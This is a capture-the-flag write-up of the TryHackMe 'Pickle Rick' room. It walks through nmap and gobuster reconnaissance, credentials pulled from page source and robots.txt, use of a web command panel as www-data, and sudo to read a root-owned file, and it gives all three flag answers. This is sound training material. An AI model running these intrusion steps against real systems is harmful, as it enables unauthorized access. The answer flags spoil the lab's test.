# Pickle Rick

<div align="left">

<figure><img src="../.gitbook/assets/BkKtAkO.png" alt="" width="375"><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>

</div>

🔗 [Pickle Rick](https://tryhackme.com/room/picklerick)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.150.53`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

Deploy the virtual machine on this task and explore the web application: 10.10.150.53

You can also access the web application using the following link: [https://10-10-150-53.p.thmlabs.com](https://10-10-150-53.p.thmlabs.com/) (this will update when the machine has fully started)

### Task 2 - Reconnaissance

```bash
su
echo "10.10.150.53 pickle_rick.thm" >> /etc/hosts

mkdir thm/pickle_rick.thm
cd thm/pickle_rick.thm

# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 pickle_rick.thm
```

```bash
PING pickle_rick.thm (10.10.150.53) 56(84) bytes of data.
64 bytes from pickle_rick.thm (10.10.150.53): icmp_seq=1 ttl=63 time=72.8 ms
64 bytes from pickle_rick.thm (10.10.150.53): icmp_seq=2 ttl=63 time=80.6 ms
64 bytes from pickle_rick.thm (10.10.150.53): icmp_seq=3 ttl=63 time=61.8 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.

<figure><img src="../.gitbook/assets/Schermata del 2023-06-17 15-26-31.png" alt=""><figcaption></figcaption></figure>

Seeing html source page we found this precious info about username

<figure><img src="../.gitbook/assets/Schermata del 2023-06-17 15-33-26.png" alt=""><figcaption><p>Username: R1ckRul3s</p></figcaption></figure>

#### 2.1 - What is the first ingredient that Rick needs? 

Try to scan open ports is always a good solution:

```bash
nmap -p- --open -sS -n -Pn pickle_rick.thm -oG open_ports
```

```bash
Starting Nmap 7.60 ( https://nmap.org ) at 2023-06-17 14:30 BST
Nmap scan report for pickle_rick.thm (10.10.150.53)
Host is up (0.066s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:E1:EC:48:00:3F (Unknown)
```

```bash
nmap -p22,80 -sS -n -Pn -sV -sC 10.10.150.53
```

```bash
Starting Nmap 7.60 ( https://nmap.org ) at 2023-06-17 14:30 BST
Nmap scan report for pickle_rick.thm (10.10.150.53)
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d0:cf:de:e0:28:b0:c4:60:97:9f:9d:50:2e:35:4c:bd (RSA)
|   256 24:c9:a0:ef:86:7e:1b:78:f8:d4:59:87:ce:cd:61:68 (ECDSA)
|_  256 c9:dc:d4:4d:b0:ec:16:7d:d6:97:ed:43:3b:6d:a2:80 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
MAC Address: 02:E1:EC:48:00:3F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We know username and IP and we can try to access with SSH port

```bash
ssh R1ckRul3s@10.10.150.53
```

```bash
The authenticity of host '10.10.150.53 (10.10.150.53)' can't be established.
ECDSA key fingerprint is SHA256:OFFPjHbvGX9Hd++AM6ynQflPu+GRjTFQluD10V6Fg1A.
Are you sure you want to continue connecting (yes/no)? yes
PWarning: Permanently added '10.10.150.53' (ECDSA) to the list of known hosts.
R1ckRul3s@10.10.150.53: Permission denied (publickey).
```

Nothing to do: Permission denied!

We can try to explore potential directory of website using gobuster

```bash
gobuster dir -u 10.10.150.53 -w /usr/share/wordlists/dirb/common.txt
```

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.150.53
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/06/17 15:11:25 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2023/06/17 15:11:26 Finished
===============================================================
```

We visit /robots.txt and we found this info (maybe password)

<figure><img src="../.gitbook/assets/Schermata del 2023-06-17 15-48-26.png" alt=""><figcaption><p>/robots.txt</p></figcaption></figure>

{% hint style="info" %}
Wubbalubbadubdub
{% endhint %}

Since we didn't find any login pages, let's try using nmap's http-enum script

```bash
nmap -p80 --script http-enum 10.10.150.53
```

```bash
Starting Nmap 7.60 ( https://nmap.org ) at 2023-06-17 15:18 BST
Nmap scan report for ip-10-10-150-53.eu-west-1.compute.internal (10.10.150.53)
Host is up (0.00015s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|_  /robots.txt: Robots file
MAC Address: 02:E1:EC:48:00:3F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds
```

Good news, we found login.php page

<figure><img src="../.gitbook/assets/Schermata del 2023-06-17 16-25-53.png" alt=""><figcaption></figcaption></figure>

Inserting user and psw found into index.html source code: R1ckRul3s and robots.txt: Wubbalubbadubdub, we give access!

Now, we have a command panel, where we can launch our commands.

<figure><img src="../.gitbook/assets/Schermata del 2023-06-17 16-30-02.png" alt=""><figcaption></figcaption></figure>

Using whoami we check that we're www-data user, with the ls command we explore the current directory where we find the first flag

<figure><img src="../.gitbook/assets/Schermata del 2023-06-17 16-31-58.png" alt=""><figcaption></figcaption></figure>

Cat command doesn't work, for this reason we use "less" command to read flag

<details>

<summary>🚩 Flag 1 (Sup3rS3cretPickl3Ingred.txt)</summary>

mr. meeseek hair

</details>

#### 2.2 - What is the second ingredient in Rick’s potion?

Reading clue.txt file we found another important info

<figure><img src="../.gitbook/assets/Schermata del 2023-06-17 16-43-07.png" alt=""><figcaption></figcaption></figure>

Exploring file system we found the 2nd ingredient

```bash
ls -ah ../../../home/rick
```

<figure><img src="../.gitbook/assets/Schermata del 2023-06-17 16-48-26.png" alt=""><figcaption><p>less ../../../home/rick/second ingredients</p></figcaption></figure>

<details>

<summary>🚩 Flag 2 (second ingredients)</summary>

1 jerry tear

</details>

#### 2.3 - What is the last and final ingredient? 

Usually the last flag is in the protected/root folder, we try to find it

```bash
sudo ls -ah ../../../root/3rd.txt
```

<figure><img src="../.gitbook/assets/Schermata del 2023-06-17 17-03-25.png" alt=""><figcaption><p>sudo less ../../../root/3rd.txt</p></figcaption></figure>

<details>

<summary>🚩 Flag 3 (3rd.txt)</summary>

fleeb juice

</details>

\
\


\
\
